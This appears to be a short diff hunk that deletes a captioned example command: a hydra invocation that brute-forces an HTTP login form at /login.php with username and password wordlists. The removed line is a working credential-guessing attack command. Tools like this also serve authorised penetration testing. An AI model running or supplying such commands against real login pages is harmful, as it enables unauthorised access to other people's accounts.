@@ -1,3 +1,0 @@
-Command to perform brute-force attack on HTTP login forms.
-hydra -L users.txt -P passwords.txt http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid" -V
-
